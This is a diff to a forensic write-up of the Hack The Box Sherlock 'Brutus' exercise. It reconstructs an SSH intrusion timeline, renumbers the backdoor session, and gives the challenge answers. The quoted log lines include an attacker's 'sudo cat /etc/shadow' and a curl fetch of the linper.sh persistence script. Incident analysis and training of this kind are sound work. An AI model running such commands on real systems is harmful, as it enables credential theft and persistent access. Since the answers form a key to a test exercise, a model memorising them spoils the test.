@@ -132,7 +132,7 @@ When `utmp.py` was initially executed on the investigator's local workstation, i
 Record: type=7, pid=2549, line=pts/1, user=root, host=65.2.161.68, time=2024-03-06 12:02:45
 ```
 Forensic analysis required strict normalization to **UTC**. By reading the binary epoch seconds directly (`1709706765`) and applying `time.gmtime()`, the true UTC timestamp was confirmed:
-$$\text{Epoch } 1709706765 \xrightarrow{\text{gmtime}} \text{2024-03-06 06:32:45 UTC}$$
+**Epoch 1709706765 → 2024-03-06 06:32:45 UTC (gmtime)**
 This perfectly synchronizes with the `auth.log` syslog entry at `Mar 6 06:32:45`.
 
 ### 3.2 Investigation Toolkit Commands
@@ -256,14 +256,17 @@ The table below summarizes the eight Hack The Box Sherlock questions, official v
      Line 359: Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
      ```
      Corroborating this, `wtmp` records a `DEAD_PROCESS` entry for PID `2491` with timestamp `2024-03-06 06:37:24 UTC`.
-  3. *Session 38 (Attacker's SECOND Session via Backdoor):* Commenced 10 seconds later at `06:37:34 UTC` (Line 360) under username `cyberjunkie` (PID 2642), terminating at `06:40:08 UTC` (Line 382).
+  3. *Session 49 (Attacker's SECOND Session via Backdoor):* Commenced 10 seconds later at `06:37:34 UTC` (Line 360) under username `cyberjunkie` (PID 2642), terminating at `06:40:08 UTC` (Line 382).
+*Note on Session Identifier Progression (Session 37 to Session 49):*
+In `auth.log`, the attacker's initial root session is registered as **Session 37** (Line 324, `06:32:45 UTC`), while the subsequent `cyberjunkie` backdoor session is registered as **Session 49** (Line 362, `06:37:34 UTC`). During the interval between these two interactive sessions, auth.log records recurring background PAM sessions (10 cron sessions for user confluence and 1 cron session for user root between 06:33 and 06:37 UTC). The logs also show internal systemd-logind session counter increments. The available evidence does not establish the precise mechanism behind the progression from Session 37 to Session 49.
+
 
   Therefore, the first SSH session ended exactly at **`2024-03-06 06:37:24`**.
 
 #### Question 8: Full Sudo Command Used to Download Script
 - **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 - **Forensic Evidence & Command Breakdown:**
-  While logged in as `cyberjunkie` during Session 38, the attacker executed administrative commands via `sudo`:
+  While logged in as `cyberjunkie` during Session 49, the attacker executed administrative commands via `sudo`:
   - `06:38:00 UTC` (Line 364): `sudo: COMMAND=/usr/bin/cat /etc/shadow` (credential harvesting)
   - `06:39:38 UTC` (Line 375):
     ```syslog
@@ -292,10 +295,10 @@ The following high-resolution timeline documents the attacker's activities from 
 | `2024-03-06 06:35:10` | `usermod[2628]` | T1548.003 Priv Escalation | User `cyberjunkie` added to supplementary administrative group **`sudo`**. |
 | `2024-03-06 06:37:24` | `sshd[2491]` / `systemd[411]` | Session Disconnect | **First SSH Session (37) ended** by user disconnect from `65.2.161.68:53184`. |
 | `2024-03-06 06:37:34` | `sshd[2642]` | Lateral Movement / Access | Attacker re-authenticates via SSH as backdoor user **`cyberjunkie`** from `65.2.161.68:53232`. |
-| `2024-03-06 06:37:34` | `systemd-logind[411]` | Session Start | `systemd-logind` assigns **Session 38** to `cyberjunkie` on `pts/1`. |
+| `2024-03-06 06:37:34` | `systemd-logind[411]` | Session Start | `systemd-logind` assigns **Session 49** to `cyberjunkie` on `pts/1`. |
 | `2024-03-06 06:38:00` | `sudo[2667]` | T1003.008 Credential Access | `cyberjunkie` executes `sudo /usr/bin/cat /etc/shadow` to dump password hashes. |
 | `2024-03-06 06:39:38` | `sudo[2682]` | T1059.004 / T1105 Tooling | `cyberjunkie` executes `sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`. |
-| `2024-03-06 06:40:08` | `sshd[2642]` / `systemd[411]` | Session Disconnect | Attacker logs out of Session 38 (`cyberjunkie` disconnected). |
+| `2024-03-06 06:40:08` | `sshd[2642]` / `systemd[411]` | Session Disconnect | Attacker logs out of Session 49 (`cyberjunkie` disconnected). |
 
 ---
 
@@ -320,7 +323,7 @@ The following high-resolution timeline documents the attacker's activities from 
               |
               | 3. Terminate Session 37 (06:37:24 UTC)
               v
-  [ Disconnect & Reconnect ] ---> Login as cyberjunkie (Session 38, 06:37:34 UTC)
+  [ Disconnect & Reconnect ] ---> Login as cyberjunkie (Session 49, 06:37:34 UTC)
               |
               | 4. Sudo Abuse & Discovery
               v
@@ -468,7 +471,7 @@ The investigation for HTB Sherlock "Brutus" was officially completed with **100%
 
 ### 11.1 HTB Challenge Verification Screenshot
 The completed Sherlock status was captured and verified in the project repository:
-`local internship project folder\Brutus\Evidence\HTB-Brutus-All-8-Tasks-Completed.png.png`
+![HTB Brutus 8/8 Tasks Solved Proof](../Evidence/HTB-Brutus-All-8-Tasks-Completed.png.png)
 
 ```
 +------------------------------------------------------------------------------------+
